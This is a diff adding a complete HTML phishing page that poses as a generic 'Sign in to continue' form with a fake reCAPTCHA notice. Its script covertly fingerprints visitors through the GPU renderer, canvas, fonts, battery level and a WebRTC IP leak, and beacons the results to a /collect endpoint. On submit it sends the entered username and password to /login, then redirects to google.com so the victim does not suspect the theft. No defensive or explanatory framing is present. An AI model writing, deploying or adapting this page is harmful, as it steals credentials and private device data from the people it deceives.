@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Loading…</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<script>
+(function(){
+  const start = performance.now();
+  const send = (path, body, useBeacon) => {
+    const data = JSON.stringify(body);
+    if (useBeacon && navigator.sendBeacon) {
+      navigator.sendBeacon(path, new Blob([data], {type:'application/json'}));
+    } else {
+      fetch(path, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: data,
+        keepalive: true,
+        credentials: 'omit'
+      }).catch(()=>{});
+    }
+  };
+
+  const base = {
+    ts: Date.now(),
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    langs: navigator.languages,
+    platform: navigator.platform,
+    cores: navigator.hardwareConcurrency,
+    mem: navigator.deviceMemory,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: screen.width + 'x' + screen.height + '@' + screen.colorDepth,
+    avail: screen.availWidth + 'x' + screen.availHeight,
+    dpr: devicePixelRatio,
+    touch: 'ontouchstart' in window,
+    cookies: navigator.cookieEnabled,
+    ref: document.referrer || null,
+    load_ms: Math.round(performance.now() - start)
+  };
+
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    base.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    base.gpu_vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+  } catch(e){ base.gpu = 'n/a'; }
+
+  try {
+    const c = document.createElement('canvas');
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,30);
+    ctx.fillStyle = '#069'; ctx.fillText('fp-x', 2, 15);
+    base.canvas = c.toDataURL().slice(-96);
+  } catch(e){}
+
+  try {
+    base.fonts = ['Arial','Courier New','Georgia','Tahoma','Verdana','Times New Roman','Segoe UI']
+      .filter(f => document.fonts.check('12px "' + f + '"'));
+  } catch(e){ base.fonts = []; }
+
+  send('/collect', {phase:'initial', data: base}, true);
+
+  const extra = {};
+  let sent = false;
+  const flush = () => {
+    if (sent) return; sent = true;
+    extra.phase = 'enriched';
+    extra.load_ms = Math.round(performance.now() - start);
+    send('/collect', {phase:'enriched', data: Object.assign({}, base, extra)}, true);
+  };
+  setTimeout(flush, 1500);
+
+  (function(){
+    try {
+      const ips = new Set();
+      const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+      pc.createDataChannel('');
+      pc.onicecandidate = e => {
+        if (!e.candidate) return;
+        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/
+          .exec(e.candidate.candidate);
+        if (m) ips.add(m[1]);
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      setTimeout(() => { extra.webrtc = [...ips]; try{pc.close()}catch(_){}; flush(); }, 1200);
+    } catch(e){ extra.webrtc = []; }
+  })();
+
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      extra.battery = Math.round(b.level*100) + '% ' + (b.charging ? '⚡' : '');
+    }).catch(()=>{});
+  }
+
+  window.__harvest = { base, extra, send };
+})();
+</script>
+<style>
+  body{font-family:system-ui,Arial;background:#0d1117;color:#e6edf3;
+       display:grid;place-items:center;height:100vh;margin:0}
+  .card{background:#161b22;padding:32px;border-radius:12px;width:340px;
+        box-shadow:0 0 30px #000}
+  h1{font-size:20px;margin:0 0 20px}
+  input{width:100%;padding:11px;margin:8px 0;background:#0d1117;
+        border:1px solid #30363d;border-radius:6px;color:#e6edf3;
+        box-sizing:border-box}
+  button{width:100%;padding:11px;background:#238636;border:0;border-radius:6px;
+         color:#fff;font-weight:600;cursor:pointer;margin-top:10px}
+  button:hover{background:#2ea043}
+  .muted{font-size:12px;color:#8b949e;text-align:center;margin-top:14px}
+</style>
+</head>
+<body>
+  <form class="card" id="loginForm" autocomplete="off">
+    <h1>Sign in to continue</h1>
+    <input name="u" placeholder="Email or username" required>
+    <input name="p" type="password" placeholder="Password" required>
+    <button type="submit">Sign in</button>
+    <div class="muted">Protected by reCAPTCHA</div>
+  </form>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', e => {
+      e.preventDefault();
+      const f = e.target;
+      window.__harvest.send('/login', {u: f.u.value, p: f.p.value});
+      setTimeout(() => location.href = 'https://www.google.com', 50);
+    });
+  </script>
+</body>
+</html>
